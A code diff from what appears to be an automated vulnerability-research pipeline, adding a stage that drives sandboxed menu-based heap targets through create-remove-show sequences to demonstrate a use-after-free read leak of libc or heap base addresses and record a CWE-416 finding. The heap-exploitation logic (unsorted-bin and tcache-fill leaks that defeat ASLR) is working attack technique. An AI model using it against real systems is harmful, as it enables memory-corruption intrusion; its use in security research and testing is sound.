@@ -119,7 +119,8 @@ def _crawl_menu_model(workdir: Path, exe: Path, opts: list[str], *, width=None) 
     `width` (from `_read_width`) selects the fixed-width read(fd, buf, W) input encoding when the
     target is not line-based. Best-effort: any failure yields {} and the caller falls back."""
     def spawn():
-        cmd = sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)]) + [str(exe)]
+        cmd = sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)],
+                                     chdir=str(workdir)) + [str(exe)]
         return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, cwd=str(workdir),
                                 preexec_fn=sandbox._rlimits(2048, 20, set_as=False))
@@ -127,6 +128,231 @@ def _crawl_menu_model(workdir: Path, exe: Path, opts: list[str], *, width=None) 
         return menu.crawl_menu(spawn, opts, per_option=2.5, width=width)
     except Exception:
         return {}
+
+
+def _spawn_menu(workdir: Path, exe: Path):
+    """A fresh sandboxed interactive process for the target (stdin/stdout piped), the same isolation
+    the crawl uses."""
+    cmd = sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)],
+                                 chdir=str(workdir)) + [str(exe)]
+    return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                            stderr=subprocess.STDOUT, cwd=str(workdir),
+                            preexec_fn=sandbox._rlimits(2048, 20, set_as=False))
+
+
+
+
+def _op_writes(opt: str, fields: list, width, *, idx=0, size=0x18, data: bytes = b"") -> list:
+    """The per-FIELD writes for one menu option: [option, field1, field2, ...]. Separate writes (not
+    one blob) so an incremental driver can drain between them -- a target whose number reader is a
+    fixed read(fd, buf, N)+strtoul number reader consumes N bytes per read and desyncs if several
+    fields arrive in one chunk, exactly why a bulk feed failed where the one-field-at-a-time crawl
+    worked."""
+    out = [menu._scalar(opt.encode(), width)]
+    sz = 0
+    for f in fields:
+        if f == "idx":
+            out.append(menu._scalar(str(idx).encode(), width))
+        elif f == "num":
+            out.append(menu._scalar(str(size).encode(), width))
+            sz = size
+        else:
+            body = data if data else (b"A" * sz if 0 < sz <= 4096 else b"AAAA")
+            out.append(body[:sz].ljust(sz, b"\x00") if 0 < sz <= 65536
+                       else menu._data(body, width))
+    return out
+
+
+def _drive(workdir: Path, exe: Path, writes: list, *, timeout: float = 10.0, idle: float = 0.2) -> bytes:
+    """Drive a staged menu target by sending each write in turn and draining the prompt between
+    them (the one-field-at-a-time cadence the crawl uses), returning all captured stdout as raw
+    bytes. Keeps a read(fd,buf,N)+strtoul reader in sync where a single bulk write would not."""
+    import selectors
+    import time as _t
+    try:
+        p = _spawn_menu(workdir, exe)
+    except Exception:
+        return b""
+    out = b""
+    try:
+        sel = selectors.DefaultSelector()
+        sel.register(p.stdout, selectors.EVENT_READ)
+        end = _t.monotonic() + timeout
+        menu._drain(p, sel, idle=idle, deadline=min(end, _t.monotonic() + 1.5))   # banner
+        for w in writes:
+            if _t.monotonic() >= end:
+                break
+            try:
+                p.stdin.write(w)
+                p.stdin.flush()
+            except (OSError, ValueError):
+                break
+            o, alive = menu._drain(p, sel, idle=idle, deadline=min(end, _t.monotonic() + 2.0))
+            out += o.encode("latin1") if isinstance(o, str) else (o or b"")
+            if not alive:
+                break
+    finally:
+        try:
+            p.kill()
+        except Exception:
+            pass
+    return out
+
+
+def identify_heap_ops(workdir: Path, exe: Path, model: dict, opts: list, width) -> dict | None:
+    """From a crawled menu model, name the add / free / view options a UAF-leak needs.
+
+    add  -- an allocating option (menu._is_alloc: reads a size, usually a string after it).
+    free -- an idx-only option (model[o] == ["idx"]).
+    view -- an idx option (NOT free) that ECHOES a stored chunk's bytes back. There is no static
+            "view" role, so probe it: add(0, MARKER) then call the candidate on index 0 and keep the
+            one whose output contains MARKER. That echo is exactly the oracle a UAF read abuses.
+
+    Returns {"add","free","view"} or None when any role is missing."""
+    add = next((o for o in opts if o in model and menu._is_alloc(model[o])), None)
+    frees = [o for o in opts if o in model and model[o] == ["idx"]]
+    free = frees[0] if frees else None
+    if not (add and free):
+        return None
+    marker = b"MK_" + os.urandom(5).hex().encode() + b"_UAF"
+    # candidates that take an index and could print: idx-leading options other than the free op
+    cands = [o for o in opts if o in model and model[o][:1] == ["idx"] and o != free]
+    for cand in cands:
+        writes = _op_writes(add, model[add], width, idx=0, size=0x80, data=marker) \
+            + _op_writes(cand, model[cand], width, idx=0)
+        out = _drive(workdir, exe, writes, timeout=8.0)
+        if marker in out:
+            return {"add": add, "free": free, "view": cand}
+    return None
+
+
+def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, target_bytes: bytes,
+                  libc_data: bytes = b"", unsorted_off: int = 0, timeout: float = 10.0) -> dict | None:
+    """Drive Create -> Remove -> Show on the SAME index in one process and recover the base the freed
+    chunk discloses. A chunk sized into the UNSORTED bin (>= 0x430) frees with its fd/bk pointing at
+    `main_arena + 0x60` (a libc pointer): libc_base = leaked - unsorted_off, confirmed only when that
+    subtraction is page-aligned (the honesty guard -- a random pointer will not land on a page). A
+    small chunk frees into tcache and leaks a (safe-linked) heap pointer. Also classifies a leaked
+    libc/PIE CODE pointer via the shared classifier. Returns {kind, base, leaked, dump, size} or None.
+    Reuses leak._le_pointer_words + leak.classify_leak verbatim -- the Show output is a byte blob."""
+    import re as _re
+
+    from ..poc import leak as _leak
+    add, free, view = ops["add"], ops["free"], ops["view"]
+
+    def _c(opt, **kw):
+        return _op_writes(opt, model[opt], width, **kw)
+
+    def _libc_from(out: bytes):
+        """A libc base from the Show output, or None. Harvests full 8-byte pointer words AND the
+        6-byte little-endian run a printf(\"%s\") viewer leaves when it truncates at the pointer's
+        NUL high bytes; accepts `leaked - unsorted_off` only when PAGE-ALIGNED (the guard that both
+        avoids fabricating a base and separates a real libc pointer from a 0x7f-prefixed stack one)."""
+        vals = [int(m.group(0), 16) for m in _re.finditer(rb"0x[0-9a-fA-F]{6,}", out)]
+        vals += _leak._le_pointer_words(out)
+        vals += [int.from_bytes(out[i:i + 6], "little") for i in range(len(out) - 5)
+                 if out[i + 5] == 0x7F]
+        if unsorted_off:
+            for v in vals:
+                if 0x7f0000000000 <= v < 0x800000000000:
+                    base = v - int(unsorted_off)
+                    if base > 0 and base % 0x1000 == 0:
+                        return base, v
+        cls = _leak.classify_leak(vals, target_bytes, libc_data)   # a leaked libc CODE pointer
+        return (cls["libc_base"], None) if cls.get("libc_base") else (None, None)
+
+    # Strategy 1 -- single large chunk: a >=0x430 request frees straight to the unsorted bin (fd =
+    # main_arena); a guard chunk keeps it off the top. Works on a notebook with no size cap.
+    big = (_c(add, idx=0, size=0x500, data=b"P" * 8) + _c(add, idx=1, size=0x500, data=b"G" * 8)
+           + _c(free, idx=0) + _c(view, idx=0))
+    # Strategy 2 -- TCACHE-FILL: a notebook that CAPS the request size (rejecting a large chunk) can only
+    # allocate tcache-sized chunks, so fill the 0x90 tcache bin with 7 frees and the 8th spills to
+    # the unsorted bin (fd = main_arena). Allocate 9 (page 8 guards the top), free 0..7, Show 7.
+    fill = []
+    for p in range(9):
+        fill += _c(add, idx=p, size=0x80, data=b"P" * 8)     # 0x80 user -> 0x90 chunk (above fastbin)
+    for p in range(8):
+        fill += _c(free, idx=p)
+    fill += _c(view, idx=7)
+    for writes, show_sz in ((big, 0x500), (fill, 0x80)):
+        out = _drive(workdir, exe, writes, timeout=timeout)
+        if not out:
+            continue
+        base, leaked = _libc_from(out)
+        if base:
+            return {"kind": "libc", "base": base, "leaked": leaked, "dump": out[:400],
+                    "size": show_sz}
+    # Strategy 3 -- small single chunk: no libc reachable, but a tcache fd is still a heap-address
+    # disclosure (defeats heap ASLR). Separate, so a stray 0x7f value never masquerades as libc.
+    out = _drive(workdir, exe, _c(add, idx=0, size=0x18, data=b"P" * 8) + _c(add, idx=1, size=0x18)
+                 + _c(free, idx=0) + _c(view, idx=0), timeout=timeout)
+    if out:
+        vals = _leak._le_pointer_words(out)
+        heapish = next((v for v in vals if (v >> 40) in (0x55, 0x56)), None)
+        if heapish:
+            return {"kind": "heap", "base": heapish, "leaked": heapish, "dump": out[:400],
+                    "size": 0x18}
+    return None
+
+
+def _try_uaf_leak(ctx, target, target_bytes, exe, workdir, model, opts, width, alloc):
+    """Discover + file a use-after-free READ leak: a notebook whose Show-after-Remove prints a freed
+    chunk discloses a libc/heap pointer WITHOUT faulting, so the watchpoint tracer never sees it.
+    Files a CWE-416 finding (detector heap_trace, so chain_primitive's _lead_finding consumes it)
+    carrying a DEMONSTRATED info-disclosure effect + the recovered base. Returns a metrics dict on a
+    hit, else None. Best-effort: self-gates to a target with a real add/free/view menu."""
+    import json as _json
+
+    from ...db.dao import FindingDAO
+    from ..poc import heap as _heap
+    if not (opts and model):
+        return None
+    ops = identify_heap_ops(workdir, exe, model, opts, width)
+    if not ops:
+        return None
+    # the bundled libc staged beside the target (stage_target put deps under workdir), for the
+    # unsorted-bin offset and the leak classifier -- NOT the host libc.
+    libc_path = next((p for p in Path(workdir).rglob("libc*.so*") if p.is_file()), None)
+    libc_data = libc_path.read_bytes() if libc_path else b""
+    unsorted_off = 0
+    if libc_path:
+        try:
+            unsorted_off = int(_heap.unsorted_bin_offset(str(libc_path)) or 0)
+        except Exception:
+            unsorted_off = 0
+    # The tcache-fill strategy drives ~18 menu ops (9 creates + 8 frees + a Show), each with a
+    # prompt drain, so it needs a generous budget -- 10s starved it mid-fill and the Show never ran.
+    hit = heap_uaf_leak(workdir, exe, ops, model, width, target_bytes=target_bytes,
+                        libc_data=libc_data, unsorted_off=unsorted_off, timeout=30.0)
+    if not hit:
+        return None
+    base_hex = hex(hit["base"])
+    what = {"libc": "libc base", "pie": "PIE image base", "heap": "heap pointer"}[hit["kind"]]
+    detail = (f"Use-after-free READ: Show (option {ops['view']!r}) of an entry freed by option "
+              f"{ops['free']!r} disclosed a {what} ({base_hex}) straight out of the freed chunk -- a "
+              f"demonstrated memory disclosure that defeats ASLR and seeds a libc-target tcache poison "
+              f"-> shell. Sequence: create -> remove -> show on the same index, {hit['size']:#x}-byte "
+              f"chunk (an unsorted-bin chunk frees with a libc main_arena pointer).")
+    eff = [{"kind": "info-disclosure", "title": f"UAF read leaks {what}", "status": "demonstrated",
+            "detail": detail, "proof": {"type": "uaf-leak", "base": base_hex, "kind": hit["kind"],
+                                        "view_op": ops["view"], "free_op": ops["free"],
+                                        "add_op": ops["add"]}}]
+    FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
+        "cwe": "CWE-416", "title": f"Use-after-free read discloses {what} (demonstrated)",
+        "severity": "high", "detector": "heap_trace", "state": "corroborated", "confidence": 0.9,
+        "dedup_key": f"CWE-416:uaf-leak:{alloc['free_name']}",
+        "function_addr": alloc["free"], "site_addr": None, "site_detail": alloc["free_name"],
+        "evidence": [{"channel": "effects", "detail": _json.dumps(eff)},
+                     {"channel": "heap-trace", "detail": detail}]})
+    ctx.emit("heaptrace.done", payload={
+        "applicable": True, "double_free": False, "use_after_free": True, "heap_overflow": False,
+        "allocator": alloc["alloc_name"], "uaf_leak": {"kind": hit["kind"], "base": base_hex,
+                                                       "view_op": ops["view"]},
+        "vuln": {"vclass": "uaf", "note": f"{alloc['alloc_name']}/{alloc['free_name']}",
+                 "leak": {"kind": hit["kind"], "base": base_hex}}})
+    ctx.progress(pct=100, msg=f"UAF read leaks {what} {base_hex} (demonstrated disclosure)")
+    return {"metrics": {"applicable": True, "use_after_free": True, "uaf_leak": hit["kind"],
+                        "base": base_hex}}
 
 
 def _allocator_ranges(functions: dict, edges, alloc: dict) -> list[list[int]]:
@@ -270,6 +496,17 @@ def heap_trace_stage(ctx) -> dict:
                 break
 
         if not found:
+            # No FAULT surfaced -- but a notebook's real primitive is often a use-after-free READ
+            # (Show-after-Remove prints a freed chunk's libc/heap pointer) that never faults, so the
+            # watchpoint tracer above cannot see it. Try that leak explicitly before giving up.
+            leak_hit = None
+            try:
+                leak_hit = _try_uaf_leak(ctx, target, target_bytes, exe, workdir, model, opts,
+                                         width, alloc)
+            except Exception:
+                leak_hit = None
+            if leak_hit:
+                return leak_hit
             ctx.emit("heaptrace.done", payload={
                 "applicable": True, "double_free": False, "use_after_free": False,
                 "heap_overflow": False, "allocator": alloc["alloc_name"],
